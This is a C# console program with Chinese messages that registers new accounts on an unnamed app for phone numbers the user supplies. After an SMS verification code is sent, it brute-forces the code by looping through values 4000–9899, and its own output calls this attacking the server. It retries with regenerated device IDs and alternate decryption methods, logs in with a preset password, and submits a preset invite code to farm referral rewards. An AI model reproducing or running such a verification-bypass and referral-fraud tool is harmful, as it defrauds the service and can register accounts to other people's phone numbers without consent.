using Newtonsoft.Json;
using System;
using System.IO;
using System.Linq;
using System.Text;

namespace ConsoleApp1
{
    internal class Program
    {
        private static int n = 0;//记录成功数量

        private static int m= 0;//记录解密验证码的方法是第几个
        static void Main(string[] args)
        {
            Console.Write("请输入手机号，多个请用英文逗号隔开：");
            Stream steam = Console.OpenStandardInput();
            Console.SetIn(new StreamReader(steam, Encoding.Default, false, 5000));
            string phones1 = Console.ReadLine();
             string[] phones2 = phones1.Split(',');
            foreach (string phone in phones2)
            {
                Register.appid = myUtil.get32str();
                m = 0;
                do1(phone);
            }
            Console.Write("程序运行结束。成功邀请了"+n+"个新用户。");
            NoExit.exit1();
        }

  
        static void do1(string phone)
        {
            Console.WriteLine("--------------------------------");
            Console.WriteLine("尝试注册新用户，手机号："+ phone);
            string registerresult = Register.isregister(phone);
            while (registerresult.Contains("409"))
            {
               Register.appid = myUtil.get32str();
               registerresult = Register.isregister(phone);
            }
            dynamic registerjson = JsonConvert.DeserializeObject(registerresult);
            string isregister1 = registerjson.isRegister;
            if (isregister1 == "0")
            {
                string sendcodeResult = Register.sendCode(phone);
                int a = 0;
                while (sendcodeResult != "200")
                {
                    a++;
                    sendcodeResult = Register.sendCode(phone);
                    if (a == 10) { break; }
                }
                if (a == 10)
                {
                    Console.WriteLine("验证码发送失败，此账号1分钟内发过验证码");
                    return;
                }
                Console.WriteLine("验证码发送成功。");
                Console.WriteLine("正在攻击服务器，暴力破解验证码，");
                Console.WriteLine("请保持网络畅通，耐心等待5分钟。。。。");
                int[] codes = Enumerable.Range(4000, 5900).ToArray();
               // Parallel.ForEach(codes, new ParallelOptions { CancellationToken = ct }, (code, state) =>
                foreach (int code in codes)
                {
                    string nonce = code.ToString();
                    /*int m = 1;
                    if (code < 2000) m = 0; else if (code < 2250) m = 3; else if (code < 4620) m = 1; else m = 2;
                    string result = Register.doMRegis(phone, nonce, m);*/
                    string result = Register.doMRegis(phone, nonce, m);
                    while (result.Contains("409"))
                    {
                        m++;
                        result = Register.doMRegis(phone, nonce, m);
                        if (m > 3)
                        {
                            m = 0;
                            break;
                        }
                        
                    }
                    Console.WriteLine("尝试使用验证码:" + nonce + "," + result);
                    if (result.Contains("409"))
                    {
                        Console.WriteLine("本次自动生成的随机设备id解密失败，跳过该手机号。");
                        break;//结束当前的发验证码循环
                    }
                   else
                   if (result.Contains("失效"))
                    {
                        Console.WriteLine("验证码已过期,重新发送验证码");
                        do1(phone);//重新开始流程
                        break;//结束当前的发验证码循环
                    }
                    else if (result.Contains("200"))
                    {
                        Console.WriteLine("已使用预设密码注册成功。");
                        string userid = Register.dologin(phone);
                        Console.WriteLine("已成功登录该账号！" +phone+":"+ userid);
                        int v = 0;//邀请码解密方法
                        string InviteCoderesult= Register.setInviteCode(userid, v);
                        if (InviteCoderesult.Contains("200"))
                        {
                            Console.WriteLine("已成功填写预设邀请码。");
                            n++;
                        }
                        while (!InviteCoderesult.Contains("200"))
                        {
                            v++;
                            InviteCoderesult=Register.setInviteCode(userid, v);
                            if (InviteCoderesult.Contains("200"))
                            {
                                Console.WriteLine("已成功填写预设邀请码。");
                                n++;
                                break;
                            }
                            if (v>8)
                            {
                                Console.WriteLine("邀请失败，因为遇到了新的加密算法。");
                                break;

                            }
                        }
                       
                        break;//结束发验证码循环
                    }
                }
            }
            else
            {
                Console.WriteLine("该手机号已被注册。");
            }

        }    
        
    }
}
